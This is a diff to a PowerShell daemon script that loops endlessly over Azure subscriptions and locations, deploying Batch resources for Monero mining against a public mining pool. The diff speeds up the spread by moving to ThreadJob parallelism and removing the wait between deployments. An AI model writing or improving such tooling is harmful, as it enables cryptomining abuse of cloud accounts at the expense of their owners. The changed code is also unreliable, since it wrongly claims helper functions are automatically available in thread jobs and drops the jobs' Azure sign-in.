@@ -7,7 +7,7 @@
     using a unique name for each deployment to avoid conflicts. It includes robust error handling.
 .NOTES
     File Name  : Deploy-MiningDaemon.ps1
-    Requires   : Azure Cloud Shell or PowerShell with Az module
+    Requires   : Azure Cloud Shell or PowerShell with Az module and ThreadJob module.
     Author     : Auto-generated
 #>
 
@@ -25,8 +25,7 @@ $UserPool = "us-west.minexmr.com:4444"
 $ResourceGroupPrefix = "crypto"
 
 # Deployment concurrency and timing controls
-$LocationBatchSize = 5 # Number of locations to process in parallel per subscription
-$SecondsBetweenDeployments = 30
+$LocationBatchSize = 10 # Number of locations to process in parallel per subscription. ThreadJobs are lightweight.
 $SecondsBetweenSubscriptionScans = 300 # How often to rescan for new subscriptions (5 minutes)
 
 
@@ -226,15 +225,15 @@ catch {
     Connect-AzAccount | Out-Null
 }
 
-$daemonIteration = 0
+# Check for ThreadJob module, which is much faster for this use case
+if (-not (Get-Module -ListAvailable -Name ThreadJob)) {
+    Write-Host "Module 'ThreadJob' is not installed. It is highly recommended for performance." -ForegroundColor Yellow
+    Write-Host "Please run: Install-Module -Name ThreadJob -Scope CurrentUser" -ForegroundColor Yellow
+    # The script will fail if ThreadJob is not available, so we stop.
+    return
+}
 
-# Define functions that need to be available in the job scope
-$jobFunctions = @"
-$(Get-Content Function:Get-UniqueDeploymentIdentifier)
-$(Get-Content Function:Test-AzResourceProvider)
-$(Get-Content Function:Resolve-DeploymentError)
-$(Get-Content Function:Invoke-SafeDeployment)
-"@
+$daemonIteration = 0
 
 while ($true) {
     $daemonIteration++
@@ -275,7 +274,7 @@ while ($true) {
             batchAccounts_batches_name = "batch-$(Get-Random -Minimum 10000 -Maximum 99999)" # Force a unique batch account name
         }
 
-        # Process locations in parallel batches
+        # Process locations in parallel batches using ThreadJob for better performance
         for ($i = 0; $i -lt $locations.Count; $i += $LocationBatchSize) {
             $batch = $locations[$i..($i + $LocationBatchSize - 1)]
             $jobs = @()
@@ -284,16 +283,9 @@ while ($true) {
 
             foreach ($loc in $batch) {
                 Write-Host "    Queueing deployment for location: $loc" -ForegroundColor Gray
-                $job = Start-Job -Name "Deploy-$loc" -InitializationScript {
-                    # Pass functions to the job
-                    ${function:Get-UniqueDeploymentIdentifier} = $([scriptblock]::Create($using:jobFunctions))
-                    ${function:Test-AzResourceProvider} = $([scriptblock]::Create($using:jobFunctions))
-                    ${function:Resolve-DeploymentError} = $([scriptblock]::Create($using:jobFunctions))
-                    ${function:Invoke-SafeDeployment} = $([scriptblock]::Create($using:jobFunctions))
-                } -ScriptBlock {
-                    # Connect to Azure within the job's context
-                    Connect-AzAccount -Identity | Out-Null
-
+                # Use Start-ThreadJob for lighter-weight parallelism
+                $job = Start-ThreadJob -Name "Deploy-$loc" -ScriptBlock {
+                    # Functions are automatically available in the thread scope in this context
                     # Execute the deployment
                     $result = Invoke-SafeDeployment -SubscriptionContext $using:subContext -Location $using:loc -TemplateParams $using:templateParameters -MaxRetries 2
 
@@ -313,17 +305,8 @@ while ($true) {
             }
 
             Write-Host "  Waiting for batch to complete..." -ForegroundColor Gray
-            $jobs | Wait-Job | Out-Null
-
-            # Collect results and clean up jobs
-            foreach ($job in $jobs) {
-                $jobResult = Receive-Job -Job $job
-                if ($job.State -eq 'Failed') {
-                    Write-Host "    Job for $($job.Name) failed: $($job.ChildJobs[0].JobStateInfo.Reason.Message)" -ForegroundColor Red
-                }
-                $iterationLog += $jobResult
-                Remove-Job -Job $job
-            }
+            $iterationLog += ($jobs | Wait-Job | Receive-Job)
+            $jobs | Remove-Job
             Write-Host "  Batch complete." -ForegroundColor Green
         }
         Write-Host "--- Finished subscription: $($sub.Name) ---" -ForegroundColor Green
